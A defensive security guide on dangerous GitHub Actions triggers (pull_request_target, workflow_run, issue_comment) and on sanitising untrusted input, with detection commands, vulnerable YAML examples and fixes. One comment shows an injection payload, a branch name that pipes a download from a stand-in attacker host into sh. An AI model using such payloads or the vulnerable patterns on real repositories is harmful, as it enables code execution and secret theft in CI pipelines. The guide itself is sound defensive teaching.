# Dangerous Triggers

Covers: `pull_request_target`, `workflow_run`, `issue_comment`, and the general rule for
sanitizing untrusted input (C1–C4 in the main gate).

---

## `pull_request_target` (C1)

**Why it's dangerous:** unlike `pull_request`, workflows triggered by `pull_request_target` run
in the context of the **base repository** — they get the real `GITHUB_TOKEN` (with `write`
permissions if granted) and access to repository/org/environment secrets, even though the
trigger is a PR that can come from any fork. If the workflow then checks out and runs the PR's
head code, that untrusted code executes with privileged access.

**Detection:** grep workflow files for `pull_request_target:` as a trigger, then check every
`actions/checkout` step in jobs that run for that trigger:

```bash
grep -rl "pull_request_target" .github/workflows/
```

If found, check whether `ref:` is set to `github.event.pull_request.head.sha` (or similar) — that's
the untrusted checkout pattern.

```yaml
# ❌ Vulnerable — checks out and builds attacker-controlled PR code with privileged secrets in scope
on:
  pull_request_target:
jobs:
  build:
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test   # attacker's package.json / test files now execute here
```

**Fix:** avoid `pull_request_target` entirely where possible. If it's genuinely needed (e.g. a
labeling workflow that only reads metadata), never check out or execute the PR head — only
interact with the PR via the API using data from the event payload, and pass any of that data
through an intermediate `env:` var (see § Sanitize user input below) rather than interpolating it
into `run:` directly.

---

## `workflow_run` (C2)

**Why it's dangerous:** `workflow_run` lets a privileged workflow trigger off the *completion* of
another workflow, and it can carry `GITHUB_TOKEN` write access and secrets. An attacker who can
influence the triggering workflow (e.g. via a PR that modifies it, or by poisoning an artifact it
produces) can cause the privileged `workflow_run` workflow to execute with elevated permissions —
privilege escalation even if the original workflow was unprivileged. Downstream workflows that
consume artifacts from the triggering run without verification are also exposed to artifact
poisoning.

**Detection:**
```bash
grep -rl "workflow_run" .github/workflows/
```

**Fix:** prefer `workflow_call` (reusable workflows) for workflow chaining — it's an explicit,
parameterized call rather than an implicit trigger off another workflow's completion, and it
doesn't inherit the same escalation surface.

```yaml
# ✅ Preferred — explicit reusable workflow call instead of workflow_run chaining
jobs:
  call-tests:
    uses: ./.github/workflows/tests.yml
    with:
      environment: staging
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}   # explicit, not `inherit`
```

If `workflow_run` is unavoidable, never trust artifacts produced by the triggering workflow
without independent verification, and keep the `workflow_run` workflow's permissions as narrow as
possible.

---

## `issue_comment` (C3)

**Why it's dangerous:** commonly used to implement `/ok-to-test`-style comment commands (e.g. to
run CI on a fork PR after maintainer approval). It can carry `write`-scoped `GITHUB_TOKEN` and
secrets. Two specific failure modes:

- **TOCTOU (Time-of-Check to Time-of-Use):** a maintainer comments `/ok-to-test`, approving the
  PR *as it exists right now*. If the workflow then checks out the PR by branch name or PR
  number (a mutable reference) instead of a specific commit SHA, the attacker can push new
  commits after approval and before the workflow runs, and the new — unapproved — code gets
  executed.
- **Approval bypass:** without an explicit authorization check, any commenter (not just
  maintainers) can trigger the workflow.

**Detection:**
```bash
grep -rl "issue_comment" .github/workflows/
```
Then check whether the workflow (a) verifies the commenter's authorization and (b) checks out a
specific commit SHA rather than `github.event.pull_request.head.ref` or a PR number.

```yaml
# ❌ Vulnerable — anyone can comment, and it checks out whatever the branch currently points to
on:
  issue_comment:
    types: [created]
jobs:
  test:
    if: github.event.issue.pull_request && contains(github.event.comment.body, '/ok-to-test')
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: refs/pull/${{ github.event.issue.number }}/head   # mutable — can change after approval
```

**Fix — two options:**

1. **Authorize + pin to SHA in the comment itself.** Check that the commenter is a trusted org
   member, and require the comment to carry the exact commit to trust:
   ```
   /ok-to-test sha=1a2b3c4d5e6f...
   ```
   Then check out only that literal SHA, submitted by an authorized actor — never a live
   branch/PR-number reference.

2. **Prefer label-based triggers instead of `issue_comment`.** Labels can only be applied by
   users with write access, so no additional authorization check is needed, and
   `github.event.pull_request.head.sha` on a `pull_request` + `labeled` trigger reflects the
   commit at the moment the label was applied:
   ```yaml
   on:
     pull_request:
       types: [labeled]
   jobs:
     test:
       if: github.event.label.name == 'ok-to-test'
       permissions:
         contents: read
       steps:
         - uses: actions/checkout@<sha>
           with:
             ref: ${{ github.event.pull_request.head.sha }}   # immutable at time of labeling
   ```

**General rule:** never check out code using a mutable reference (PR number, branch name) in any
privileged context — always resolve to a full commit SHA.

---

## Sanitize user input (C4)

This applies everywhere, not just inside the trigger-specific workflows above. Any value that
originates from something an external user controls — PR title/body, issue title/body, commit
messages, branch names, forked repo names, review comments — must never be spliced directly into
a `run:` block or similar code-execution context, because GitHub performs `${{ }}` expansion
*before* the shell (or JS action) ever runs, so the attacker's string becomes literal code.

```yaml
# ❌ Vulnerable — a branch named `$(curl attacker.site/x|sh)` or a PR title with embedded
# shell metacharacters executes arbitrary commands
- run: |
    echo "Testing branch ${{ github.head_ref }}"

# ✅ Safe — value flows through the environment as data, never as script text
- env:
    HEAD_REF: ${{ github.head_ref }}
  run: |
    echo "Testing branch $HEAD_REF"
```

Apply the `env:`-indirection pattern consistently, even for contexts that look inherently safe
(`github.repository`, `github.sha`) — consistency avoids having to re-litigate "is this one
safe?" for every new context added later, and some contexts that look safe today (e.g. anything
derived from a fork's metadata) can become attacker-influenced as workflows evolve.
